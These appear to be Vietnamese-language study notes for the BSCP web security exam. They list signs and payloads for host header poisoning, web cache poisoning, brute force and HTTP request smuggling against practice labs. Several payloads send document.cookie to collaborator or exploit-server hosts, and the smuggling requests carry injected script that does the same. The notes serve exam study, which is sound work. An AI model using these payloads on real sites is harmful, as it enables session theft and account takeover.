# BSCP

# Stage1

## Host header

- Dấu hiệu: (Host được reflect trong src của thẻ <script>)

```
X-Forwarded-Host: EXPLOIT.net
X-Host: EXPLOIT.net
X-Forwarded-Server: EXPLOIT.net
```

- Payload: Reset password về host của mình để lấy reset link
- Bypass: exploit?host

## Web cache

- Dấu hiệu: Trong response có header: `X-cache`. Có file js `/resources/js/tracking.js`
- Payload:

```jsx
document.location='https://collaboration.net/?cookies='+document.cookie;
```

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/7fa30518-8ebc-446e-b540-305cb3ed385c/219ccee3-e333-4020-b01f-4cf801a23fdc/Untitled.png)

## Brute-force

Sử dụng wordlist username/password được cấp để bruteforce ( Test cuối cùng nếu như không detect được các dạng bài khác) 

## HTTP Smuggling

- Dấu hiệu: Dùng tool quét
- Payload
    - CL-TE:
    
    ```jsx
    POST /?d4pN=378814766 HTTP/1.1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.
    0) Gecko/20100101 Firefox/122.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.
    9,image/avif,image/webp,*/*;q=0.8
    Transfer-Encoding: chunked
    Transfer-Encoding: xND5yJgk
    Content-Length: 960
    Connection: keep-alive
    
    1f
    v1bph=x&search-term=aaa&skll7=x
    0
    
    GET /post?postId=1 HTTP/1.1
    Host: 0ab100070329be91809ca3db008700c1.web-security-academy.n
    et
    Cookie: session=SIoADJ8O44rX2T53Nyntl9r0unPzMT1k; _lab_analyt
    ics=zilzDMN1ibdniLZxFPcJHpTKC5RSasZEut80UWGkQxdwDNDwAY8zNagIc
    drw5FOtTJ6FVCCCGAABVUFwNha73e8bEpU7WMzFu83WHy8ZdPlIMPg5tsqE86
    GO1S50R4n4OFK8AFdchukqjhOFUsAJNQxu4uvUKiTzeMQPuAkFZvL7kbnN6t4
    aoBS7qCK5sUK1L1mhKccADkDiScpPtDRDSSqAaWa7WLHvjRTn6dqiBI48pMPm
    bPxpPnxvZA6pGmbd; _lab=46%7cMCwCFDonoE4LDLE1bnes4x5%2fO%2bw1S
    E%2b2AhQzFnfs7ROBnfFFWG%2b93AP1ObrDX%2b5jvsTXoqZ9bfXgdbzdiYZp
    vhEInuGk3MWBbsmIPzCS3wJ0e1HoDZONH3Jp%2bSpfG8IPhMb6IzAXnHO9e%2
    f%2b2EnJhEB6kn4btpBr3tTTVi3yVrKnDewY%3d
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.
    0) Gecko/20100101 Firefox/122.0"><script>location.href="http
    s:///exploit-0a5400cb03f8be9580d3a23e017d0088.exploit-server.
    net/?c="+document.cookie</script>
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 15
    
    x=1
    ```
    
    ![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/7fa30518-8ebc-446e-b540-305cb3ed385c/0e5df2b8-fb71-43b1-9fee-11c0ff49b0d1/Untitled.png)
    
    ![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/7fa30518-8ebc-446e-b540-305cb3ed385c/db5af1d3-9b41-42e1-bc25-52d97e0f5688/Untitled.png)
    
    - **TE.CL dualchunk**
    
    ```jsx
    POST / HTTP/1.1
    Host: TARGET.net
    Content-Type: application/x-www-form-urlencoded
    Content-length: 4
    Transfer-Encoding: chunked
    Transfer-encoding: identity
    
    e6
    GET /post?postId=4 HTTP/1.1
    User-Agent: a"/><script>document.location='http://COLLABORATOR.com/?c='+document.cookie;</script>
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 15
    
    x=1
    0\r\n  
    \r\n
    ```
    

## XSS

- Dấu hiệu:
    - Có file js/script lạ
    - SearchTerm
- Payload
